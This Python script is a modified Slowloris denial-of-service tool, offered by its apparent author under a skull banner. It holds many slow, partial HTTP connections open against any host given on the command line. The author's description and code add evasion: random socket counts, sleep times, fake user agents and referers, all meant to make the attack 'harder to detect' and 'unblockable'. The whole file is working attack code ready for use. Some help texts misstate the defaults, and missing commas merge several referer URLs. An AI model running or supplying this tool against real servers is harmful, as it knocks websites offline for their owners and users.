from argparse import ArgumentParser
from logging import basicConfig, DEBUG, INFO, info, debug
from random import randint, choice
import socket
import sys
import time

Banner = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠖⠒⠢⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡴⠃⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⠁⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠂⠀⠤⠤⡀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢄⠀⠀⠀⠀⠀⠀
⢠⠞⠁⠀⣀⣠⣤⠤⠤⠤⠤⢤⣤⠤⠤⠤⠤⣤⣀⣀⡀⠀⠀⠀⠑⢤⠀⠀⠀⠀
⣣⠔⠚⠻⣄⣡⣞⣄⣠⣆⠀⢼⣼⣄⣀⣀⣠⣆⠜⡘⡻⠟⠙⣲⠦⣈⢳⡀⠀⠀
⡇⠒⢲⡤⡜⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠤⣖⠬⠓⠂⠉⣿⠇⠀⠀ WE LIVE WE LOVE WE LIE.....
⠙⠲⠦⠬⣧⡀⠀⠀⠀⠀⠀⣠⣿⣿⣷⡄⠀⠀⠀⠀⠀⣞⠀⢀⣲⠖⠋⠀⠀⠀
⠀⠀⠀⠀⠘⣟⢢⠃⠀⠀⠀⠉⠙⠻⠛⠁⠀⠀⠀⢀⡜⠒⢋⡝⠁⢀⣀⣤⠂⠀
⠀⠀⠀⠀⠀⡇⠷⠆⠶⠖⠀⠀⠀⠀⠀⠀⠀⠀⣠⠮⠤⠟⠉⠀⢰⠱⡾⣧⠀⠀
⠀⠀⠀⠀⠀⠹⢄⣀⣀⠀⠀⠀⠀⠀⠀⣀⡤⠚⠁⠀⢠⣤⡀⣼⢾⠀⠀⡟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠒⡏⠀⡡⠣⢖⣯⠶⢄⣀⣿⡾⠋⢸⢀⡶⠿⠲⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⣹⠃⣀⣤⠞⠋⠀⠉⠢⣿⣿⡄⠀⣿⠏⠀⠀⠐⢣
⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢱⢡⡾⠋⠀⠀⢀⡐⣦⣀⠈⠻⣇⢸⢁⣤⡙⡆⠈⡏
⠀⠀⠀⠀⠀⠀⣠⠎⢁⠔⡳⡟⠀⠐⠒⠒⠋⠀⠠⡯⠙⢧⡈⠻⣮⠯⣥⠧⠞⠁
⠀⠀⠀⣀⠴⠋⠀⢶⠋⢸⡝⠀⠀⠀⠀⠀⠀⠀⠀⣸⢦⠀⠙⡆⠘⠦⢄⡀⠀⠀
⠀⠀⣸⠅⢀⡤⢺⢸⠀⢸⡃⠤⠀⠀⠀⠀⣀⡤⢚⣋⣿⢄⡀⢇⡀⠀⠀⣝⡶⠀
⠀⠀⢿⠀⡏⠀⠘⠞⠀⢸⡵⣦⠤⠤⠖⣿⠥⠞⠉⠀⢸⠖⠁⠀⠙⠢⣑⠶⣽⢂
⠀⠀⠸⠤⠃⠀⠀⠀⠀⠀⠉⢳⠂⠈⡽⠁⠀⠀⠀⢀⡼⠒⠓⢤⠀⠀⠀⠙⠚⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠓⡎⠀⠀⠀⠀⢠⠎⣠⠀⠀⠈⢳⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢸⡶⠗⠋⣱⠄⠀⠀⠀⣧⠀⠀⠀⢀
⠀⠀⠀⠀⠀⠀⠀⣀⠴⠒⠒⠦⣤⣷⠂⢀⡸⠁⠀⡼⠁⠀⠀⠀⠈⢺⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⠋⢀⣀⡀⠀⠀⠀⠀⠀⠈⡇⠀⠀⠙⠢⠤⠤⣄⡤⠼⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠑⢦⣄⣉⣑⠢⠄⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠓⠒⠒⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
parser = ArgumentParser(
    print(Banner),
    print("Example: python main.py google.com"),
    description="""DFM modified Slowloris, the low bandwidth, yet greedy and poisonous HTTP client created by yours truly bahahaisthebest\n
    what is this? this is a modified version of slowloris that is more efficient and more effective than the original slowloris\n
    by changing the socket count and sleep time every X seconds, it makes it harder for the server to detect the attack\n
    the amount of sockets and sleep time is randomized between a range of values to make it even harder for the server to detect the attack\n
    sure this is not as effective as a ddos attack but it is still effective and unblockable\n"""
    
)
parser.add_argument("host", nargs="?", help="Host to perform a stress test on")
parser.add_argument(
    "-p", "--port", default=80, help="Port of the webserver, usually 80", type=int
)
parser.add_argument(
    "-s",
    "--sockets",
    default=randint(10, 15),
    help="Number of sockets to use in the test, default is random between 10 and 15 sockets",
    type=int,
)
parser.add_argument(
    "-v",
    "--verbose",
    dest="verbose",
    action="store_true",
    help="Increases logging",
)
parser.add_argument(
    "-ua",
    "--randuseragents",
    dest="randuseragent",
    action="store_true",
    help="Randomize user-agents with each request header, on by default",
)
parser.add_argument(
    "--sleeptime",
    dest="sleeptime",
    default=randint(10, 20),
    type=int,
    help="Time to sleep between each header sent.",
)
parser.add_argument(
    "--change-sleeptime",
    dest="change_sleeptime",
    default=randint(30, 60),
    type=int,
    help="Change the sleep time to a new random value every X seconds (default is 60-100 seconds).",
)
parser.add_argument(
    "--change-socket-count",
    dest="change_socket_count",
    default=randint(50, 70),  # Change socket count every 300-600 seconds by default
    type=int,
    help="Change the socket count to a new random value every X seconds (default is 300-600 seconds).",
)
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=True)

args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=DEBUG if args.verbose else INFO,
)

def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))

def send_header(self, name, value):
    self.send_line(f"{name}: {value}")

list_of_sockets = []

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

def init_socket(ip: str):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    s.connect((ip, args.port))

    s.send_line(f"GET /?{randint(0, 4000)} HTTP/1.1")

    ua = generate_user_agent()  # Call a function to generate a unique user agent
    ref = generate_referer()  # Call a function to generate a unique referer
    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    s.send_header("Connection", "keep-alive")
    s.send_header("Keep-Alive", randint(110, 120))
    s.send_header("Referer", ref)
    s.send_header("Cookie", f"whoami={randint(0, 4000)}")

    return s

def generate_user_agent():
    browser = choice(["Chrome", "Firefox", "Edge", "Safari"])
    version = f"{randint(1, 150)}.0.0.0"
    os = choice(["Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7"])
    engine = "AppleWebKit/537.36 (KHTML, like Gecko)"  # Common for modern browsers

    user_agent = f'"{browser}/{version} ({os}) {engine}"'
    return user_agent

def generate_referer():
    referer = choice(
        [
            "https://www.linkedin.com/"
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://www.yandex.com/",
            "https://duckduckgo.com/",
            "https://www.ecosia.org/",
            "https://www.qwant.com/",
            "https://www.swisscows.com/"
            "https://www.searchencrypt.com/"
            "https://www.gibiru.com/",
            "https://www.startpage.com/",
            "https://www.dogpile.com/",
            "https://www.sogou.com/",
            "https://www.ask.com/",
            "https://www.baidu.com/",
            "https://www.yahoo.com/",
            "https://www.aol.com/",
            "https://www.yippy.com/",
            "https://www.lycos.com/",
            "https://www.webcrawler.com/",
            "https://www.infospace.com/",
            "https://www.hotbot.com/",
            "https://www.excite.com/",
            "https://www.mojeek.com/",
            "https://www.gigablast.com/",
            "https://www.searchencrypt.com/",
            "https://www.oscobo.com/",
            "https://www.yippy.com/",
            "https://www.qwant.com/",
            "https://www.givero.com/",
            "https://www.searchencrypt.com/",
            "https://www.oscobo.com/",
            "https://www.facebook.com",
            "https://www.facebook.com/",
            "https://www.twitter.com/",
            "https://www.instagram.com/",
            "https://www.youtube.com/",
            "https://www.amazon.com/",
            "https://www.ebay.com/",
            "https://www.reddit.com/",
            "https://www.wikipedia.org/",
            "https://www.nytimes.com/",
            "https://www.cnn.com/",
            "https://www.apple.com/",
            "https://www.microsoft.com/",
            "https://www.github.com/",
            "https://www.wordpress.org/",
            "https://www.x.com/",
            "https://www.paypal.com/",
            "https://www.spotify.com/",
            "https://www.netflix.com/",
            "https://www.pinterest.com/",
            "https://www.tumblr.com/",
            "https://www.blogger.com/",
            "https://www.ynet.co.il/",
            "https://www.jpost.com/",
            "https://www.haaretz.co.il/",
            "https://www.timesofisrael.com/",
            "https://www.calcalist.co.il/",
            "https://www.mako.co.il/",
            "https://www.ice.co.il/",
            "https://www.walla.co.il/",
            "https://www.n12.co.il/",
            "https://www.ynetnews.com/",
            "https://www.ynet.co.il/",
            "https://www.jpost.com/",
        ]
    )
    return referer

def rotate_user_agent():
    while True:
        ua = generate_user_agent()
        ref = generate_referer()
        for s in list(list_of_sockets):
                s.send_header("User-Agent", ua)
                s.send_header("Accept-language", "en-US,en,q=0.5")
                s.send_header("Connection", "keep-alive")
                s.send_header("Keep-Alive", randint(110, 120))
                s.send_header("Referer", ref)
                s.send_header("Cookie", f"whoami={randint(0, 4000)}")
        time.sleep(600)
change_socket_count_interval = args.change_socket_count  # Change socket count every 300 seconds (adjust as needed)
change_sleeptime_interval = args.change_sleeptime  # Change sleeptime every 600 seconds (adjust as needed)

def slowloris_iteration():
    current_time = time.time()
    time_until_socket_change = change_socket_count_interval - (current_time - slowloris_iteration.start_time)
    time_until_sleeptime_change = change_sleeptime_interval - (current_time - slowloris_iteration.sleeptime_start_time)

    if time_until_socket_change <= 0:
        new_socket_count = randint(10, 15)
        args.sockets = new_socket_count
        slowloris_iteration.start_time = current_time

    if time_until_sleeptime_change <= 0:
        new_sleeptime = randint(10, 20)
        args.sleeptime = new_sleeptime
        slowloris_iteration.sleeptime_start_time = current_time
    info(
            "Socket count: %s, Sleep time: %s, %s seconds to socket change, %s seconds to sleeptime change",
            len(list_of_sockets),
            args.sleeptime,
            round(time_until_socket_change, 2),
            round(time_until_sleeptime_change, 2),
        )
    # Try to send a header line to each socket
    for s in list(list_of_sockets):
        try:
            s.send_header("Hello there", randint(1, 5000))
        except socket.error:
            list_of_sockets.remove(s)

    # Some of the sockets may have been closed due to errors or timeouts.
    # Re-create new sockets to replace them until we reach the desired number.

    diff = args.sockets - len(list_of_sockets)
    if diff <= 0:
        return

    info("Creating %s new sockets...", diff)
    for _ in range(diff):
        try:
            s = init_socket(args.host)
            if not s:
                continue
            list_of_sockets.append(s)
        except socket.error as e:
            debug("Failed to create a new socket: %s", e)

slowloris_iteration.start_time = time.time()  # Initialize the start time
slowloris_iteration.sleeptime_start_time = time.time()  # Initialize the sleeptime start time

def main():
    ip = args.host
    max_socket_count = args.sockets
    info("Attacking %s with up to %s sockets.", ip, max_socket_count)
    info("Sleeping for %s seconds", args.sleeptime)

    next_socket_change = time.time() + args.change_socket_count
    next_sleeptime_change = time.time() + args.change_sleeptime

    socket_count = 0

    while True:
        if socket_count < max_socket_count and time.time() >= next_socket_change:
            info("Increasing socket count...")
            socket_count += 1
            next_socket_change = time.time() + args.change_socket_count
            try:
                s = init_socket(ip)
                list_of_sockets.append(s)
            except socket.error as e:
                debug(e)

        try:
            slowloris_iteration()
        except (KeyboardInterrupt, SystemExit):
            info("Stopping Slowloris")
            break
        except Exception as e:
            debug("Error in Slowloris iteration: %s", e)

        if time.time() >= next_sleeptime_change:
            args.sleeptime = randint(5, 15)
            next_sleeptime_change = time.time() + args.change_sleeptime

        debug("Sleeping for %d seconds", args.sleeptime)
        time.sleep(args.sleeptime)

if __name__ == "__main__":
    main()